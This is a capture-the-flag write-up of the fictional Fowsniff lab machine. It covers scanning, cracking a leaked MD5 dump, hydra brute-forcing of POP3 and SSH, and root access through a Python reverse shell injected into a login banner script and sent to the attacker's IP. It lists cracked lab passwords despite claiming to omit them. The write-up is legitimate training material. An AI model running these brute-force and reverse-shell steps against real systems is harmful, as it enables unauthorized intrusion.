## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
This boot2root machine is brilliant for new starters. You will have to enumerate this machine by finding open ports, do some online research (its amazing how much information Google can find for you), decoding hashes, brute forcing a pop3 login and much more!

This will be structured to go through what you need to do, step by step. Make sure you are [connected to our network](http://tryhackme.com/access)

Credit to [berzerk0](https://twitter.com/berzerk0) for creating this machine. This
```

## IP-Address
```IP-Address
10.201.50.10
```


## RustScan 
```bash
$ rustscan -a 10.201.50.10 -b 450 -t 2000 --ulimit 5000 -- -e tun0 
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 60
80/tcp  open  http    syn-ack ttl 60
110/tcp open  pop3    syn-ack ttl 60
143/tcp open  imap    syn-ack ttl 60
```

## Gobuster 
```bash
$ gobuster dir -u http://10.201.50.10/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 4 -x php,txt,bake
/.htaccess            (Status: 403) [Size: 296]
/.htaccess.php        (Status: 403) [Size: 300]
/.htaccess.txt        (Status: 403) [Size: 300]
/.htaccess.bake       (Status: 403) [Size: 301]
/.htpasswd            (Status: 403) [Size: 296]
/.htpasswd.php        (Status: 403) [Size: 300]
/.htpasswd.txt        (Status: 403) [Size: 300]
/.htpasswd.bake       (Status: 403) [Size: 301]
/LICENSE.txt          (Status: 200) [Size: 17128]
/README.txt           (Status: 200) [Size: 1288]
/assets               (Status: 301) [Size: 313] [--> http://10.201.50.10/assets/]
/images               (Status: 301) [Size: 313] [--> http://10.201.50.10/images/]
/robots.txt           (Status: 200) [Size: 26]
/robots.txt           (Status: 200) [Size: 26]
/security.txt         (Status: 200) [Size: 459]
/server-status        (Status: 403) [Size: 300]
Progress: 81912 / 81916 (100.00%)
```
Then after watching this we go to the web page which is `http://10.201.50.10/#` we get to know that this website is temporary not working and the corporation which its actually belong to their social media handles are already hacked so after searching on google we identified that there twitter which is now know as X.com on that platform hacker reveals there credentials on https://pastebin.com/378rLnGi but when we visiting there we get to know that pastebin remove those credentials so then we searched https://pastebin.com/378rLnGi on https://web.archived.org/ and got 8 copy were we get 
```OLD-Website
1. Fowsniff is a fictional company, and all tweets, "passwords", users, hostnames, pastess and "emails" are entirely fictional.
2. - These materials are is part of a Capture the Flag educational challenge created by @berzerk0 on twitter.
3. ALL MATERIAL REGARDING FOWSNIFF IS FICTIONAL.
4. -All information contained within is invented solely for this purpose and does not correspond 
5. to any real persons or organizations.
6. - Any similarities to actual people or entities is purely coincidental and occurred accidentally.
7. Backups of the "password dump" can be found here:
8. - https://raw.githubusercontent.com/berzerk0/Fowsniff/main/fowsniff.txt 
9. - https://web.archive.org/web/20200920053052/https://pastebin.com/NrAqVeeX
```
then we got the `https://raw.githubusercontent.com/berzerk0/Fowsniff/main/fowsniff.txt` link which gives us the hashed credentials 
```hashed
FOWSNIFF CORP PASSWORD LEAK
            ''~``
           ( o o )
+-----.oooO--(_)--Oooo.------+
|                            |
|          FOWSNIFF          |
|            got             |
|           PWN3D!!!         |
|                            |         
|       .oooO                |         
|        (   )   Oooo.       |         
+---------\ (----(   )-------+
           \_)    ) /
                 (_/
FowSniff Corp got pwn3d by B1gN1nj4!
No one is safe from my 1337 skillz!
 
 
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
 
Fowsniff Corporation Passwords LEAKED!
FOWSNIFF CORP PASSWORD DUMP!
 
Here are their email passwords dumped from their databases.
They left their pop3 server WIDE OPEN, too!
 
MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P
 
l8r n00bz!
 
B1gN1nj4

-------------------------------------------------------------------------------------------------
This list is entirely fictional and is part of a Capture the Flag educational challenge.

--- THIS IS NOT A REAL PASSWORD LEAK ---
 
All information contained within is invented solely for this purpose and does not correspond
to any real persons or organizations.
 
Any similarities to actual people or entities is purely coincidental and occurred accidentally.

-------------------------------------------------------------------------------------------------
```

Then we used crackstation to decode the credentials
```credentials
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4          ==    mailcall
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56       ==    bilbo101
tegel@fowsniff:1dc352435fecca338acfd4be10984009          ==    apples01
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb       ==    skyler22
seina@fowsniff:90dc16d47114aa13671c697fd506cf26          ==    scoobydoo2
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd          ==    [NO FOUND]
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b        ==    carp4ever
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11         ==    orlando12
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e         ==    07011972
```

I Got all the credentials except the stone but lets try to get through other things
in CTF Room its says to user metasploit but rather using metasploit i used hydra to get the actual user and password
```bash
$ hydra -L /home/kali/user.txt -P /home/kali/pass.txt -s 110 -vV 10.201.50.10 pop3

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-31 17:30:31
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 64 login tries (l:8/p:8), ~4 tries per task
[DATA] attacking pop3://10.201.50.10:110/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] CAPABILITY: +OK
CAPA
TOP
UIDL
RESP-CODES
PIPELINING
AUTH-RESP-CODE
USER
SASL PLAIN

110][pop3] host: 10.201.50.10   login: seina   password: [password omitted]
```
I got this as the Credentials Valid
```Credentials
Login : seina
Pass : [password omitted]
```

After Logging in Telnet by 
```bash
$ telnet 10.201.50.10 110                                  
Trying 10.201.50.10...
Connected to 10.201.50.10.
Escape character is '^]'.
+OK Welcome to the Fowsniff Corporate Mail Server!
USER seina
+OK
PASS scoobydoo2
+OK Logged in.
LIST
+OK 2 messages:
1 1622
2 1280
```
RETR 1 - 1st message
```First_message
RETR 1
+OK 1622 octets
Return-Path: <stone@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1000)
        id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: <20180313185107.0FA3916A@fowsniff>
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)
Dear All,
A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.
We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.
This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.
The temporary password for SSH is "[password omitted]"
You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.
Come see me in my office at your earliest convenience and we'll set it up.
Thanks,
A.J Stone
``` 

In this we First got the Temporary SSH Password `[password omitted]`
then Lets check Message 2 
```Second_message
RETR 2 
+OK 1280 octets
Return-Path: <baksteen@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1004)
        id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
To: seina@fowsniff
Subject: You missed out!
Message-Id: <20180313185405.101CA1AC2@fowsniff>
Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
From: baksteen@fowsniff
Devin,
You should have seen the brass lay into AJ today!
We are going to be talking about this one for a looooong time hahaha.
Who knew the regional manager had been in the navy? She was swearing like a sailor!
I don't know what kind of pneumonia or something you brought back with
you from your camping trip, but I think I'm coming down with it myself.
How long have you been gone - a week?
Next time you're going to get sick and miss the managerial blowout of the century,
at least keep it to yourself!
I'm going to head home early and eat some chicken soup. 
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.
Feel better,
Skyler
PS: Make sure you change your email password. 
AJ had been telling us to do that right before Captain Profanity showed up.
```
We get the credentials but dont know about the user we used hydra to get to know about the user 
```bash             
└─$ hydra -L /home/kali/user.txt -p '[password omitted]' 10.201.50.10 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-31 17:47:15
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:8/p:1), ~1 try per task
[DATA] attacking ssh://10.201.50.10:22/
[22][ssh] host: 10.201.50.10   login: baksteen   password: [password omitted]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-31 17:47:23
```
And the valid username password for `SSH` is 
```Credentials
login: baksteen   
password: [password omitted]
```
With this i get inside the Machine
```bash
baksteen@fowsniff:~$ ls
Maildir  term.txt
baksteen@fowsniff:~$ cat term.txt 
I wonder if the person who coined the term "One Hit Wonder" 
came up with another other phrases.
```
then we checked the groups and user id and we got this 
```bash
baksteen@fowsniff:~/Maildir$ groups
users baksteen
baksteen@fowsniff:~/Maildir$ id
uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
baksteen@fowsniff:~/Maildir$ find / -group baksteen -type f -perm -g=x 2>/dev/null
baksteen@fowsniff:~/Maildir$ 
baksteen@fowsniff:~/Maildir$ cd /
baksteen@fowsniff:/$ find / -group baksteen -type f -perm -g=x 2>/dev/null
baksteen@fowsniff:/$ 
baksteen@fowsniff:/$ find / -group users -type f -perm -g=x 2>/dev/null
/opt/cube/cube.sh
baksteen@fowsniff:/$ 
baksteen@fowsniff:/$ cat /opt/cube/cube.sh
printf "
                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions\n\n"

```

Lets Now use Find Command to check if user group can access the file using the user baksteen 
```bash
find / -group users -type f -perm -g=x 2>/dev/null
```

And the Out it 
```bash
baksteen@fowsniff:/$ find / -group users -type f -perm -g=x 2>/dev/null
/opt/cube/cube.sh
baksteen@fowsniff:/$ nano /opt/cube/cube.sh
baksteen@fowsniff:/$ ls -la /opt/cube/
total 12
drwxrwxrwx 2 root   root  4096 Jul 31 18:07 .
drwxr-xr-x 6 root   root  4096 Mar 11  2018 ..
-rw-rwxr-- 1 parede users  851 Mar 11  2018 cube.sh
baksteen@fowsniff:/$ nano /opt/cube/cube.sh
```
And the I run the File
```bash
baksteen@fowsniff:/opt/cube$ cube.sh
cube.sh: command not found
baksteen@fowsniff:/opt/cube$ bash cube.sh 

                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions
```
And Got the Reverse shell We Inject this code into the `/opt/cube/cube.sh` 
#python3_Reverse_Shell
```Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.36.74",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

And On our machine run net-cat and got the shell
```bash
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.17.36.74] from (UNKNOWN) [10.201.8.32] 41322
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cd root
# lws 
/bin/sh: 3: lws: not found
# ls
Maildir
flag.txt
# cat fl
cat: fl: No such file or directory
# cat flag.txt
   ___                        _        _      _   _             _ 
  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
 | (__/ _ \ ' \/ _` | '_/ _` |  _| || | / _` |  _| / _ \ ' \(_-<_|
  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
               |___/ 

 (_)
  |--------------
  |&&&&&&&&&&&&&&|
  |    R O O T   |
  |    F L A G   |
  |&&&&&&&&&&&&&&|
  |--------------
  |
  |
  |
  |
  |
  |
 ---

Nice work!

This CTF was built with love in every byte by @berzerk0 on Twitter.

Special thanks to psf, @nbulischeck and the whole Fofao Team.
```

# END